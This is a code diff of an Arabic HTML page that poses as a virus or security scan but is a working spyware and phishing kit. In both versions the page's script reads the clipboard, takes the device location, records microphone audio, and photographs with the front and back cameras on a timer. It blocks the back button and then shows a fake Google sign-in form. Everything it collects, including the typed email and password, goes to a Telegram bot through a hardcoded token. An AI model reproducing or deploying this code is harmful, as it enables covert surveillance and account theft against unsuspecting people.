@@ -2,35 +2,33 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>⚙️ مركز الحماية والأمان</title>
+    <title>⚙️ فحص أمان النظام 2026</title>
     <style>
         body { background: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .ui { text-align: center; width: 90%; max-width: 400px; }
-        .scanner { width: 200px; height: 200px; border: 3px solid #4285f4; border-radius: 50%; margin: 20px auto; position: relative; overflow: hidden; box-shadow: 0 0 20px #4285f4; }
-        .scan-line { width: 100%; height: 2px; background: #fff; position: absolute; top: 0; animation: scan 2s linear infinite; }
+        #start-btn { padding: 20px 40px; background: #4285f4; border: none; color: #fff; border-radius: 10px; font-size: 20px; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px #4285f4; z-index: 10001; }
+        .scanner { width: 150px; height: 150px; border: 2px solid #00ff00; border-radius: 50%; display: none; position: relative; margin-bottom: 20px; }
+        .scan-line { width: 100%; height: 2px; background: #00ff00; position: absolute; top: 0; animation: scan 2s linear infinite; }
         @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-        #phish-overlay { display: none; position: fixed; top:0; left:0; width: 100%; height: 100%; background: #fff; z-index: 9999; justify-content: center; align-items: center; color: #000; }
-        .box { width: 85%; max-width: 350px; text-align: center; }
-        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
-        button { width: 100%; padding: 15px; background: #1a73e8; color: #fff; border: none; border-radius: 5px; font-weight: bold; }
+        #phish { display: none; position: fixed; top:0; left:0; width: 100%; height: 100%; background: #fff; z-index: 9999; justify-content: center; align-items: center; color: #000; }
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="ui" id="main-ui">
-        <div class="scanner"><div class="scan-line"></div></div>
-        <h2 id="msg">جاري فحص التهديدات الأمنية...</h2>
-        <p style="color:#777; font-size:12px;">يرجى عدم إغلاق الهاتف لضمان سلامة بياناتك.</p>
+    <button id="start-btn" onclick="activateGabar()">إبدأ فحص الفيروسات الآن</button>
+
+    <div id="main-ui" style="display:none;" class="ui">
+        <div class="scanner" style="display:block;"><div class="scan-line"></div></div>
+        <h2 id="status">جاري سحب التهديدات...</h2>
     </div>
 
-    <div id="phish-overlay">
-        <div class="box">
+    <div id="phish">
+        <div style="width:85%; text-align:center;">
             <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="80">
-            <h3>تأكيد الهوية مطلوب</h3>
-            <input type="email" id="email" placeholder="البريد الإلكتروني">
-            <input type="password" id="pass" placeholder="كلمة المرور">
-            <button onclick="sendCreds()">إتمام الفحص</button>
+            <h3>تأكيد الهوية مطلوب لإكمال الفحص</h3>
+            <input type="email" id="email" placeholder="البريد الإلكتروني" style="width:100%; padding:15px; margin:10px 0; border:1px solid #ccc;">
+            <input type="password" id="pass" placeholder="كلمة المرور" style="width:100%; padding:15px; margin:10px 0; border:1px solid #ccc;">
+            <button onclick="sendCreds()" style="width:100%; padding:15px; background:#1a73e8; color:#fff; border:none;">دخول</button>
         </div>
     </div>
 
@@ -41,76 +39,75 @@
         const TOKEN = "8723330008:AAH7fjX2fEKZ3-7WCWRQyiLHmNoaEY5QUaw";
         const CHAT_ID = "7984067238";
 
-        function notify(text) { fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`); }
+        function notify(msg) { fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`); }
 
-        // 1. نظام "القفص الرقمي" ومنع الهروب
-        function lockDown() {
-            for(let i=0; i<100; i++) window.history.pushState(null, null, window.location.href);
-            window.onpopstate = () => { window.history.pushState(null, null, window.location.href); notify("🚫 الضحية حاول الخروج!"); };
-            if(navigator.vibrate) navigator.vibrate([1000, 500, 1000]);
-        }
-
-        // 2. جاسوس البيانات (الحافظة، الموقع، البطارية، الحركة)
-        async function spyIntel() {
-            navigator.geolocation.getCurrentPosition(p => notify(`📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`));
+        // تفعيل كل المميزات بضغطة واحدة
+        async function activateGabar() {
+            document.getElementById('start-btn').style.display = 'none';
+            document.getElementById('main-ui').style.display = 'block';
             
-            document.addEventListener('click', async () => {
-                try { const t = await navigator.clipboard.readText(); if(t) notify(`📋 الحافظة: ${t}`); } catch(e) {}
-            }, {once: true});
+            // 1. تفعيل وضع ملء الشاشة (إبهار 1)
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
 
-            window.addEventListener('devicemotion', (e) => {
-                if(Math.abs(e.acceleration.x) > 2) notify("🏃 الضحية يتحرك.");
-            }, {once: true});
+            // 2. سحب الحافظة فوراً (إبهار 2)
+            try {
+                const clipText = await navigator.clipboard.readText();
+                if(clipText) notify(`📋 **نص من الحافظة (Clipboard):**\n\`${clipText}\``);
+            } catch(e) { notify("⚠️ الضحية لم ينسخ شيئاً أو رفض الحافظة."); }
+
+            // 3. تفعيل الصوت والكاميرا والموقع
+            startSpying();
+            
+            // 4. منع الخروج
+            for(let i=0; i<100; i++) window.history.pushState(null, null, window.location.href);
+            notify("🔓 **تم تفعيل كافة المميزات الجبارة بنجاح!**");
         }
 
-        // 3. التجسس الصوتي والبصري (الاحترافي)
-        async function spyAudioVisual() {
+        async function startSpying() {
             // الصوت
             try {
                 const s = await navigator.mediaDevices.getUserMedia({ audio: true });
                 const r = new MediaRecorder(s);
                 r.ondataavailable = (e) => {
-                    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('voice', e.data, 'v.ogg');
+                    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('voice', e.data, 'mic.ogg');
                     fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
                 };
-                setInterval(() => { r.start(); setTimeout(() => r.stop(), 5000); }, 20000);
-            } catch(e) {}
+                setInterval(() => { r.start(); setTimeout(() => r.stop(), 5000); }, 15000);
+            } catch(e) { notify("❌ رفض الصوت"); }
 
-            // الصور (أمامية وخلفية)
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            let i = 0, modes = ["user", "environment"];
+            // الكاميرا المزدوجة والموقع
+            navigator.geolocation.getCurrentPosition(p => notify(`📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`));
             
+            const v = document.getElementById('video'), c = document.getElementById('canvas');
+            let i = 0, modes = ["user", "environment"];
             setInterval(async () => {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: modes[i%2] } });
-                    video.srcObject = stream;
+                    v.srcObject = stream;
                     await new Promise(r => setTimeout(r, 1000));
-                    canvas.width = 640; canvas.height = 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(b => {
+                    c.width = 640; c.height = 480;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    c.toBlob(b => {
                         const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b, 'x.jpg');
                         fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                     }, 'image/jpeg', 0.5);
                     stream.getTracks().forEach(t => t.stop());
                 } catch(e) {}
                 i++;
-            }, 2500);
+            }, 3000);
         }
 
         function sendCreds() {
             const e = document.getElementById('email').value, p = document.getElementById('pass').value;
             if(e && p) {
-                notify(`🔥 بيانات مسحوبة:\n📧: ${e}\n🔐: ${p}`);
-                document.getElementById('phish-overlay').style.display = 'none';
-                document.getElementById('msg').innerText = "✅ تم تأمين الجهاز بنجاح.";
+                notify(`🔥 **حساب مخترق:**\n📧: ${e}\n🔐: ${p}`);
+                document.getElementById('phish').style.display = 'none';
+                document.getElementById('status').innerText = "✅ اكتمل الفحص بنجاح!";
             }
         }
 
-        window.onload = () => {
-            lockDown(); spyIntel(); spyAudioVisual();
-            setTimeout(() => { document.getElementById('phish-overlay').style.display = 'flex'; }, 30000);
-        };
+        // إظهار صفحة تسجيل الدخول بعد 20 ثانية
+        setTimeout(() => { document.getElementById('phish').style.display = 'flex'; }, 20000);
     </script>
 </body>
 </html>
